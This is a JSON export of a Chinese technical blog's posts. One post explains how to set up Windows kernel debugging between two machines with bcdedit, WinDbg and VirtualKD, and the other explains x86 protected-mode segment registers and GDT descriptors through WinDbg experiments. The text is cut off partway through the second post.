[{"title":"Windows内核双机调试","url":"/2024/04/21/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/","content":"<h1 id=\"传统模式BCD搭建\"><a href=\"#传统模式BCD搭建\" class=\"headerlink\" title=\"传统模式BCD搭建\"></a>传统模式BCD搭建</h1><h2 id=\"1、系统设置\"><a href=\"#1、系统设置\" class=\"headerlink\" title=\"1、系统设置\"></a>1、系统设置</h2><p>打开<code>CMD</code>，输入下列指令后回车，会得到一个<code> &#123;ID&#125;</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bcdedit /copy &#123;current&#125; /d DebugEntry </span><br></pre></td></tr></table></figure>\n\n<p>将<code>&#123;ID&#125;</code>代入下列两个指令中运行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bcdedit /displayorder &#123;current&#125; &#123;ID&#125;  </span><br><span class=\"line\">bcdedit /debug &#123;ID&#125; ON  </span><br></pre></td></tr></table></figure>\n\n<p>然后<code>Ctrl+R</code>，输入<code>msconfig</code>，点击引导，在选中刚刚创建的DebugEntry，然后点击高级选项。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105162913268.png\" alt=\"image-20230105162913268\"></p>\n<p>打勾调试端口并选择，一个<code>COM</code>，然后勾上波特率，选中<code>115200</code>。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105162926669.png\" alt=\"image-20230105162926669\"></p>\n<h2 id=\"2、虚拟机设置\"><a href=\"#2、虚拟机设置\" class=\"headerlink\" title=\"2、虚拟机设置\"></a>2、虚拟机设置</h2><p>点击编辑虚拟机设置。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105162950026.png\" alt=\"image-20230105162950026\"></p>\n<p>如果有打印机就移除打印机，然后添加一个串口，然后设置如下图，其中管道名的<code>com_1</code>为在系统中设置的端口，COMX就写为com_x。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163005860.png\" alt=\"image-20230105163005860\"></p>\n<h2 id=\"3、WinDbg设置\"><a href=\"#3、WinDbg设置\" class=\"headerlink\" title=\"3、WinDbg设置\"></a>3、WinDbg设置</h2><p>打开<code> File-Kernel Debug</code></p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163021462.png\" alt=\"image-20230105163021462\"></p>\n<p>然后点击<code>COM</code>，把虚拟机填写的内容填到对应位置。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163032692.png\" alt=\"image-20230105163032692\"></p>\n<p>然后点击确定。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163044566.png\" alt=\"image-20230105163044566\"></p>\n<p>提示<strong>Waiting to reconnect</strong>后，开始打开虚拟机，选择<code>Debug Entry</code>。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163056432.png\" alt=\"image-20230105163056432\"></p>\n<p>此时会连接到Windbg。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163109615.png\" alt=\"image-20230105163109615\"></p>\n<h3 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h3><p>在代码中添加一个<code>int3</code>或者调用<code>KbBreakPoint</code>函数后编译，扔到虚拟机加载，当DriverEntry被调用后会断在设置了断点的位置。</p>\n<h3 id=\"符号文件\"><a href=\"#符号文件\" class=\"headerlink\" title=\"符号文件\"></a>符号文件</h3><p>打开<code> File-Symbol File Path</code></p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163127556.png\" alt=\"image-20230105163127556\"></p>\n<p>输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">srv*c:\\symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>\n\n<p><code>C:\\symbols</code>表示的是下载的符号文件所存放的路径。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230105163149616-1672907510488-1.png\" alt=\"image-20230105163149616\"></p>\n<p>输入完毕后点击<code>.Reload</code>，点<code>OK</code>。（需要梯子）</p>\n<p><a href=\"https://blog.csdn.net/qq_41252520/article/details/123095105\">https://blog.csdn.net/qq_41252520/article/details/123095105</a></p>\n<h1 id=\"VirtualKD双击调试\"><a href=\"#VirtualKD双击调试\" class=\"headerlink\" title=\"VirtualKD双击调试\"></a>VirtualKD双击调试</h1><p>VKD为内核加速器，因为Bcdedit方式搭建的双击调试环境有时候会很卡，不利于调试。</p>\n<h2 id=\"1、虚拟机设置\"><a href=\"#1、虚拟机设置\" class=\"headerlink\" title=\"1、虚拟机设置\"></a>1、虚拟机设置</h2><p>VKD（VirtualKD）有两个版本：官方版本和修改版本，其中官方版本在VM&gt;&#x3D;15时会出现无法连接虚拟机情况，而修改版修复了该问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VKD:http://sysprogs.com/legacy/virtualkd/</span><br><span class=\"line\">VKD-Redux:https://github.com/BwRy/VirtualKD-Redux/</span><br></pre></td></tr></table></figure>\n\n<p>下载好安装包后，打开虚拟机，拖动对应版本的安装包到虚拟机中。</p>\n<p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230522104559066.png\" alt=\"image-20230522104559066\"></p>\n<p>然后运行安装包，一直下一步即可。</p>\n<blockquote>\n<p>在选择启动项时注意要F8进入安全模式选择禁止驱动签名，这样在编写驱动时无需加载签名即可调试启动。</p>\n</blockquote>\n<h2 id=\"2、本机设置\"><a href=\"#2、本机设置\" class=\"headerlink\" title=\"2、本机设置\"></a>2、本机设置</h2><p><img src=\"/../images/Windows/Windows%E5%86%85%E6%A0%B8%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20230522104818031.png\" alt=\"image-20230522104818031\"></p>\n<ul>\n<li>Start debugger automatically:自动连接到调试器。当虚拟机打开后，VMMonitor会自动检测虚拟机是否开启，然后自动打开调试器连接。</li>\n<li>Stop debugger automatically：与上边相反。</li>\n<li>DbgBreakPoint() on start:在连接调试器成功后自动中断。</li>\n</ul>\n<p>然后中间的选项为选择想用的调试器，右边则为手动打开调试器之类的选项。</p>\n","categories":["Windows-Kernel"]},{"title":"x86保护模式","url":"/2022/10/10/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/","content":"<h1 id=\"1、保护模式简介\"><a href=\"#1、保护模式简介\" class=\"headerlink\" title=\"1、保护模式简介\"></a>1、保护模式简介</h1><p>CPU分有：<code>实模式</code>、<code>保护模式</code>、<code>虚拟8086</code>模式，大多数操作系统都运行在保护模式下。</p>\n<p>保护模式主要是用来保护寄存器、数据结构、指令，实际上也就是保护寄存器，因为cpu的数据都存放在寄存器中。</p>\n<p>保护模式的特点：段和页。</p>\n<ul>\n<li>实模式：16位系统DOS，访问的都是物理地址，不安全。</li>\n<li>保护模式：将物理地址隔阂后，使用一种线性的虚拟地址来访问，相对实模式来说比较安全。并用段和页的特点来维护虚拟地址。</li>\n</ul>\n<p>保护模式具体资料可以在 Intel白皮书第三卷 中查看。</p>\n<h1 id=\"2、段寄存器\"><a href=\"#2、段寄存器\" class=\"headerlink\" title=\"2、段寄存器\"></a>2、段寄存器</h1><h2 id=\"2-1-段选择子\"><a href=\"#2-1-段选择子\" class=\"headerlink\" title=\"2.1 段选择子\"></a>2.1 段选择子</h2><p>CPU一共有八个段寄存器：ES CS SS DS FS GS LDTR TR ，OD可见前6个，但GS段寄存器windows并未使用（32位下）。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled.jpeg\" alt=\"Untitled\"></p>\n<p>如果运行在实模式下，则只有前四个有用。</p>\n<p>如果是64位，则使用GS而不是FS。</p>\n<p>当执行下列汇编代码时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov [0x12345678],eax</span><br></pre></td></tr></table></figure>\n\n<p>实际上cpu所“看到的”代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov dword ptr ds:[<span class=\"number\">0x12345678</span>],eax</span><br><span class=\"line\"><span class=\"comment\">//ds.base+0x12345678</span></span><br><span class=\"line\"><span class=\"comment\">//cs.base+0x12345678</span></span><br><span class=\"line\"><span class=\"comment\">//ss.base+0x12345678</span></span><br></pre></td></tr></table></figure>\n\n<p>💡 ds段寄存器通常时用来存放要访问数据的段地址。cs段寄存器表示要执行的代码。ss段寄存器表示堆栈的段地址。[…]则表示一个内存单元，比如ds:[1],cs:[1],ss:[1]。——王爽《汇编语言》</p>\n<p>段寄存器结构： 共96位， 16位可见，80位不可见。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_1.jpeg\" alt=\"Untitled_1\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">SegMen</span>&#123;</span>  </span><br><span class=\"line\">  WORD Selector;<span class=\"comment\">//16位  </span></span><br><span class=\"line\">  WORD Attributes;<span class=\"comment\">//16位  </span></span><br><span class=\"line\">  DWORD Base;<span class=\"comment\">//32位  </span></span><br><span class=\"line\">  DWORD Limit;<span class=\"comment\">//32位</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>读段寄存器指令：mov ax,es <strong>只能读16位</strong>（可见部分）</p>\n<p>写段寄存器指令：mov ds,ax <strong>写了96位的</strong>。</p>\n<p>段寄存器可以用mov指令读写，但是LDTR和TR除外。</p>\n<p>加载段描述符至段寄存器的指令共有三种：</p>\n<ul>\n<li>mov ss,ax 使用mov指令</li>\n<li><strong>les lss lds lfs lgs</strong>修改对应的段寄存器</li>\n<li>cs不能通过上述指令改变，否则会导致EIP的改变，必须保证cs与eip一起改。后文会讲解如何修改CS并在需要时提升权限。</li>\n</ul>\n<p>其中选择子(Selector)有如下结构：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled.png\" alt=\"Untitled\"></p>\n<p>打开OD，随便加载一个程序可以看到段寄存器对应的选择子。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_2.jpeg\" alt=\"Untitled_2\"></p>\n<p>以fs的选择子为例进行解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fs=0x0053 =&gt; 0000 0000 0101 0011</span><br><span class=\"line\">由于前面两个字节为0，因此单独拿后面两个字节讲解。</span><br><span class=\"line\">0101 0011</span><br><span class=\"line\">根据上面给出的Selector表可以对这两个字节划分。</span><br><span class=\"line\">01010 0 11</span><br><span class=\"line\"></span><br><span class=\"line\">值     |    含义</span><br><span class=\"line\">- ------------------------------------------------</span><br><span class=\"line\">01010  |    欲查表的索引号,此处为十进制5</span><br><span class=\"line\">0      |    欲查哪一块表;0-&gt;GDT 1-&gt;LDT</span><br><span class=\"line\">11     |    哪一环的权限(RPL),此处为十进制3,因此为3环</span><br><span class=\"line\">根据公式 addr = GDT + 8 * index计算后可得到fs的段描述符</span><br><span class=\"line\">addr = 0xfffff88004590000 + 8 * 5 = 0xfffff88004590028</span><br><span class=\"line\"></span><br><span class=\"line\">2: kd&gt; dq fffff88004590028</span><br><span class=\"line\">fffff880`04590028  **00cff300`0000ffff** 0020fb00`00000000</span><br><span class=\"line\">fffff880`04590038  00000000`00000000 04008b58`f0000067</span><br><span class=\"line\">fffff880`04590048  00000000`fffff880 ff40f3fd`f000bc00</span><br><span class=\"line\">fffff880`04590058  00000000`00000000 00cf9a00`0000ffff</span><br><span class=\"line\">fffff880`04590068  00000000`00000000 00000000`00000000</span><br><span class=\"line\">fffff880`04590078  00000000`00000000 00000000`00000000</span><br><span class=\"line\">fffff880`04590088  00000000`00000000 00000000`00000000</span><br><span class=\"line\">fffff880`04590098  00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>GDT：全局描述表（Global Description Table），在操作系统加载完毕后就存在的一快内存。实际上就是一个数组，每一个元素就是一个描述符，多个组合一起就构成了全局描述符表。而每一个描述符共64位，包含了以下的这些信息：段基址、段长度、属性。段寄存器通过解析选择子后得到索引后在GDT中跳转获取对应描述符。</p>\n</blockquote>\n<blockquote>\n<p>LDT：局部描述表（Local Description Table），与GDT功能一致，但不能单独存在，只能嵌套在GDT中。</p>\n</blockquote>\n<ul>\n<li><strong>windbg获取GDT</strong></li>\n</ul>\n<p>GDT可以使用windbg的命令可以查看gdt表的地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdtr寄存器（windbg伪寄存器，是windbg通过sgdt lgdt指令获取的，为了方便用户，才模拟了一个寄存器叫gdtr，实际是没有这个寄存器的） :</span><br><span class=\"line\">存两个值，一个是GDT表的首地址，一个是GDT表的大小(字节为单位)   48位 </span><br><span class=\"line\">r gdtr  r查看gdtr寄存器的地址</span><br><span class=\"line\">r gdtl  r查看gdtr寄存器的大小  都查gdtr</span><br><span class=\"line\">dd  xxxx       4字节查看内存</span><br><span class=\"line\">dq  XXXX       8字节查看内存</span><br><span class=\"line\">dq  xxxx Lnum    查看固定数量元素的内存</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_3.jpeg\" alt=\"Untitled_3\"></p>\n<ul>\n<li><strong>r3代码获取GDT</strong></li>\n</ul>\n<p>通过指令sgdt获取。其中共获取到6个字节,前两个字节位gdt寄存器的大小,后面四个字节为gdt的地址。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_1.png\" alt=\"Untitled_1\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> var[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tsgdt var</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x,%x\\n&quot;</span>,*(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>*)&amp;var[<span class=\"number\">2</span>],*(<span class=\"type\">unsigned</span> <span class=\"type\">short</span>*)&amp;var[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_2.png\" alt=\"Untitled_2\"></p>\n<h2 id=\"2-2-段描述符\"><a href=\"#2-2-段描述符\" class=\"headerlink\" title=\"2.2 段描述符\"></a>2.2 段描述符</h2><p>段描述符有如下结构：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_3.png\" alt=\"Untitled_3\"></p>\n<p>将gdt的一个段描述符<code>0x00cff300 0000ffff</code>进行拆分可得到如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">base:0x00000000</span><br><span class=\"line\">attr:0x0cf3(前面的0是补齐2字节)</span><br><span class=\"line\">limit:0xfffff(前面的0是补齐4字节)</span><br><span class=\"line\"></span><br><span class=\"line\">attr的属性又可以细分如下：</span><br><span class=\"line\">0xc = 1100</span><br><span class=\"line\">----------------------------</span><br><span class=\"line\">G:1;1-&gt;limit以4k对齐,limit = ( limit + 1 ) * 4096 - 1    0-&gt;字节对齐,limit = limit</span><br><span class=\"line\">D/B:1</span><br><span class=\"line\">0:0</span><br><span class=\"line\">AVL:0</span><br><span class=\"line\"></span><br><span class=\"line\">0xf3 = 1111 0011</span><br><span class=\"line\">-----------------------------</span><br><span class=\"line\">P:1</span><br><span class=\"line\">DPL:11</span><br><span class=\"line\">S:1</span><br><span class=\"line\">Type:0011(3)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"G位\"><a href=\"#G位\" class=\"headerlink\" title=\"G位\"></a>G位</h3><p>段对齐粒度。 也就是决定了Limit大小的一个位。</p>\n<p>在上文填充段寄存器隐藏部分时，Limit在描述符中只有5个16进制位表示，剩下的3个16进制位就需要看G位。</p>\n<p>当G为0时，整个段将以字节对齐，Limit大小单位为字节，所以精确到1。Limit直接就是段长。段寄存器中的Limit高位补0。</p>\n<p>当G为1时，整个段将以4KB对齐，Limit大小单位为4KB，所以段的末尾处一定是以FFF结尾。段寄存器中的Limit低位补FFF。</p>\n<h3 id=\"D-x2F-B位\"><a href=\"#D-x2F-B位\" class=\"headerlink\" title=\"D&#x2F;B位\"></a>D&#x2F;B位</h3><p><strong>&#x3D;0</strong>表示是16位的单位,<strong>&#x3D;1</strong>表示32位的单位。</p>\n<p>如果是代码段的描述符,那么称为D;如果是数据段的描述符,称为B。</p>\n<p>大段或者小段，分为三种情况：</p>\n<p><strong>对CS段来说：</strong></p>\n<p>为1时，默认为32位寻址。</p>\n<p>为0时，默认为16位寻址。</p>\n<p>前缀67改变寻址方式。</p>\n<p><strong>对SS段来说：</strong></p>\n<p>为1时，隐式堆栈访问指令（PUS H POP CALL RETN等）修改的是32位寄存器ESP</p>\n<p>为0时，隐式堆栈访问指令（PUSH POP CALL RETN等）修改的是16位寄存器SP</p>\n<p>对于向下扩展的数据段：</p>\n<p>为1时，段上限大小为4GB(2的32次方)。 为0时 段上限大小为64KB(2的16次方)。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_4.png\" alt=\"Untitled_4\"></p>\n<h3 id=\"P位\"><a href=\"#P位\" class=\"headerlink\" title=\"P位\"></a>P位</h3><p>有效位 1：描述符有效 0：描述符无效</p>\n<p>当描述符无效时，任何尝试加载该描述符、访问该描述符对应的段间地址都会报错。</p>\n<h3 id=\"DPL位\"><a href=\"#DPL位\" class=\"headerlink\" title=\"DPL位\"></a>DPL位</h3><p>能访问段描述符的权限。</p>\n<p>💡  RPL：发出请求的权限等级。</p>\n<p>​\tCPL：当前请求的权限等级。一般特指为CS的RPL。</p>\n<p>​\tDPL：能否访问段描述符的权限等级。</p>\n<p>​\t三者的联系可总结为：<code>在CPL的权限下，以RPL的权限去访问DPL权限。</code></p>\n<h3 id=\"S位\"><a href=\"#S位\" class=\"headerlink\" title=\"S位\"></a>S位</h3><pre><code>描述符类型位。 为0时，是系统段描述符。 为1时，是代码或数据段描述符。具体类型需要搭配type属性来判断。\n</code></pre>\n<h3 id=\"Type位\"><a href=\"#Type位\" class=\"headerlink\" title=\"Type位\"></a>Type位</h3><p>由S位决定了具体是代码段还是数据段描述符</p>\n<ul>\n<li><strong>当S&#x3D;1,type表示为数据段的描述</strong></li>\n</ul>\n<blockquote>\n<p>数据段： A位：数据段是否被访问过位，访问过为1，未访问过为0  段描述符是否被加载过 W位：数据段是否可写位，可写为1，不可写为0 E位：向下扩展位，0向上扩展：段寄存器.base+limit区域可访问。1向下扩展：除了base+limit以外的部分可访问。</p>\n</blockquote>\n<blockquote>\n<p>代码段： A位：代码段是否被访问过位，访问过为1，未访问过为0  段描述符是否被加载过 R位：代码段是否可读位，可读为1，不可读为0。(但R位为0,代码段照样可以读) C位：一致位。1：一致代码段(0环的函数在3环可以调用)。   0：非一致代码段(各调各的)</p>\n</blockquote>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_5.png\" alt=\"Untitled_5\"></p>\n<ul>\n<li><strong>当S&#x3D;0,type表示为系统描述,门</strong></li>\n</ul>\n<p>(小于8是16位的系统描述,大于8是32位)</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_17.png\" alt=\"Untitled_17\"></p>\n<h3 id=\"针对E位的理解与实验：\"><a href=\"#针对E位的理解与实验：\" class=\"headerlink\" title=\"针对E位的理解与实验：\"></a>针对E位的理解与实验：</h3><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_6.png\" alt=\"左边为向上扩展,右边为向下扩展。红色代表可以访问,绿色不可访问\"></p>\n<p>左边为向上扩展,右边为向下扩展。红色代表可以访问,绿色不可访问</p>\n<p><code>Tip:段描述符有没有4G,首先是看E位的拓展方向,其次是看Base和limit之间的大小。</code></p>\n<p>首先构造一条段描述符.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00cff700`0000ffff</span><br><span class=\"line\"></span><br><span class=\"line\">base:00000000 </span><br><span class=\"line\">attr:0cf7 </span><br><span class=\"line\">limit:fffff   ;由于G位是1所以这里实际为(0xfffff+1) * 0x1000 - 1 = 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">E位:0111,向下扩展</span><br></pre></td></tr></table></figure>\n\n<p>通过windbg的<code>e[b|d|D|f|p|q|w] address [Values]</code>指令可以修改GDT中保存的段描述符。修改8003f090(GDTR &#x3D; 8003f000),然后输出gdt查看前20个描述表,<code>dq address l20</code>。(注意是小写L,不是数字1)。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_7.png\" alt=\"Untitled_7\"></p>\n<hr>\n<h4 id=\"实验一：ds\"><a href=\"#实验一：ds\" class=\"headerlink\" title=\"实验一：ds\"></a>实验一：ds</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//code1:</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> var = <span class=\"number\">0</span>; <span class=\"comment\">//全局变量</span></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">_asm&#123;</span><br><span class=\"line\">mov ax,<span class=\"number\">0x93</span> <span class=\"comment\">//10010 011 -&gt; index = 18 * 8 = 144 (0x90)</span></span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">mov dword ptr ds:[var],<span class=\"number\">0x20</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,var);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行出错。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_8.png\" alt=\"Untitled_8\"></p>\n<p><strong>分析：</strong>异常断在了赋值var的地方。首先在描述符中attr为0x0cf7,Type&#x3D;0111表示为向下扩展、可读写、已访问。根据上图可知,如果E位为向下扩展,则base+limit这段区域是无法访问的即(0x00000000-0xffffffff),因此在写数据时发生了错误。<strong>修复方法为将E位修改为向上扩展(E&#x3D;0)，或者将limit修改为一个小范围值,使得其他区域的内存可以访问(在demo2实现)。</strong></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_9.png\" alt=\"Untitled_9\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_10.png\" alt=\"Untitled_10\"></p>\n<p>实验成功!</p>\n<hr>\n<h4 id=\"实验二：ss\"><a href=\"#实验二：ss\" class=\"headerlink\" title=\"实验二：ss\"></a>实验二：ss</h4><p>首先将0x8003f090修改回0x00cff700&#96;0000ffff。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> var = <span class=\"number\">0</span>; <span class=\"comment\">//局部变量</span></span><br><span class=\"line\">_asm&#123;</span><br><span class=\"line\">mov ax,<span class=\"number\">0x93</span></span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">mov dword ptr ds:[var],<span class=\"number\">0x20</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,var);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行同样报错。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_11.png\" alt=\"Untitled_11\"></p>\n<p><strong>分析：</strong>需要注意的是中断打在了printf上,说明我们上边的ASM代码没问题!那么一个新问题来了,为什么demo1中中断打在了var赋值上?虽然我们显式使用了ds段来描述变量var,但仍存在一个问题,<strong>变量var属于堆栈地址</strong>,所以实际上<code>mov dword ptr ds:[var]</code>被编译器翻译成了<code>mov dword ptr ss:[var]</code></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_12.png\" alt=\"Untitled_12\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_13.png\" alt=\"Untitled_13\"></p>\n<p>因为我们没有修改ss段,所以上面对ss段的操作没问题。根据单步执行,可以发现中断的位置是printf函数。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_14.png\" alt=\"Untitled_14\"></p>\n<p>根据我们构造的描述符可知,base&#x3D;0,limit的范围为0xFFFFFFFF,然后又属于向下扩展,所以0x0-0xFFFFFFFF的区域无法访问,printf中必然有用到ds段的数据,但这些数据有没有访问权限,因此访问中断了。<strong>修复方法为将limit设置为一个很小的范围,这样其他的区域就可以访问了。比如0x1FFF。(00c0f700&#96;00000001)</strong></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_15.png\" alt=\"Untitled_15\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_16.png\" alt=\"Untitled_16\"></p>\n<p>实验完成!</p>\n<hr>\n<p>使用windbg的<code>dg segment</code>命令可以快速查看段寄存器对应的段描述符。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_4.jpeg\" alt=\"Untitled_4\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_5.jpeg\" alt=\"Untitled_5\"></p>\n<h2 id=\"2-3-段寄存器证明\"><a href=\"#2-3-段寄存器证明\" class=\"headerlink\" title=\"2.3 段寄存器证明\"></a>2.3 段寄存器证明</h2><p>读的时候只能读到16位(选择子)，但写的时候却写入了96位。如何证明剩下的80位是否存在？</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/Untitled_6.jpeg\" alt=\"Untitled_6\"></p>\n<ul>\n<li><strong>Attribute探测</strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td 